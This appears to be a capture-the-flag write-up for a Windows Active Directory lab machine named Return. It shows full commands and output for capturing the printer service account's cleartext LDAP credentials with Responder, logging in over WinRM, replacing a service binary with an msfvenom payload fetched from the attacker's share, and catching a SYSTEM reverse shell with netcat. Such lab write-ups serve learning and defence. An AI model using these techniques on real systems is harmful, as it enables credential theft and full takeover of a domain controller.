---
layout: default
---

# Return

# Enumeration

Scanner reported the following open ports.

```bash
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-11-08 11:03:06Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack Microsoft Windows RPC
59728/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

 

### Port 80

We will enumerate first the service that is not part of an Active Directory envirnoment.

Visiting the webpage we can see that is an administration panal for a printer. But we will leave this for later.

![Untitled](Return%20(AD)%2059a3ed5d7d9642b1bb67fa9d08cdc896/Untitled.png)

### Port 135

- RPC
- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/return/enumeration]
└─$ rpcclient -U '%' 10.10.11.108
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

### Port 139/445

- SMB
- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/return/enumeration]
└─$ crackmapexec smb 10.10.11.108 -u '%' -p '%'  --shares   
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [-] return.local\%:% STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/windows/return/enumeration]
└─$ smbclient -L \\\\10.10.11.108\\ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### Port 389

- LDAP
- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/return/enumeration]
└─$ ldapsearch -x -H ldap://10.10.11.108 -b "DC=return,DC=local"     
# extended LDIF
#
# LDAPv3
# base <DC=return,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

In the web page  we could try to change the server address to point to us and setup **responder** to see if we capture something.

- Server Address → 10.10.14.12

 

```bash
[LDAP] Cleartext Client   : 10.10.11.108
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

Indeed we have receive credentials for user svc-printer.

- `svc-printer:1edFg43012!!`

```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec winrm 10.10.11.108 -u 'svc-printer'  -p '1edFg43012!!'         
SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

We can use them to connect to the machine.

# Foothold

In this phase we will enumerate again the domain, but this time we have valid credentials.

### SMB

```bash
┌──(kali㉿kali)-[~/machines/windows/return]
└─$ crackmapexec smb 10.10.11.108 -u 'svc-printer'  -p '1edFg43012!!' --shares
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share
```

### RPC

- We can enumerate from RPC

```bash
┌──(kali㉿kali)-[~/machines/windows/return]
└─$ rpcclient -U 'svc-printer' 10.10.11.108
Password for [WORKGROUP\svc-printer]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[svc-printer] rid:[0x44f]
```

### LDAP

- We can enumerate from LDAP

We can connect using evil-winrm

# Privilege escalation

Our user is part of the Server Operators group. This means that we probably have the capability to  modify and restart services.

First we list the services running in the machine

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
```

Checking these services one by one we can see if can modify any of theme

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Acl -Path hklm:\System\CUrrentControlSet\services\VMTOols | format-list

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CUrrentControlSet\services\VMTOols
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         BUILTIN\Server Operators Allow  SetValue, CreateSubKey, Delete, ReadKey
         BUILTIN\Server Operators Allow  -1073676288
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  -2147483648
Audit  :
Sddl   : O:BAG:SYD:AI(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;CCDCLCSWRPSDRC;;;SO)(A;CIIOID;SDGWGR;;;SO)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-3-1024-106536593
         6-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```

Now we need to know if the service run as root or not.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cmd.exe /c "sc qc vmtools"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vmtools
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VMware Tools
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

We see LocalSystem, so it root who run the service.

- First modify the executable of the service with a msfvenom generated payload.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> copy \\10.10.14.12\share\shell.exe .
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cmd.exe /c "sc config vmtools binpath='C:\Users\svc-printer\Documents\shell.exe'"
[SC] ChangeServiceConfig SUCCESS
```

- Set up a listener and restart the service

I’ve got an error that says **The system cannot find the file specified**, to solve I simply move the payload to another location in the system until it worked.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cmd.exe /c 'sc config vmtools binpath="C:\shell.exe"'
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cmd.exe /c "sc start vmtools"
```

Finally we have a shell as root.

```bash
┌──(kali㉿kali)-[~/tools]
└─$ nc -lvnp 443                                                                                                                                                         
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.108] 62215
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```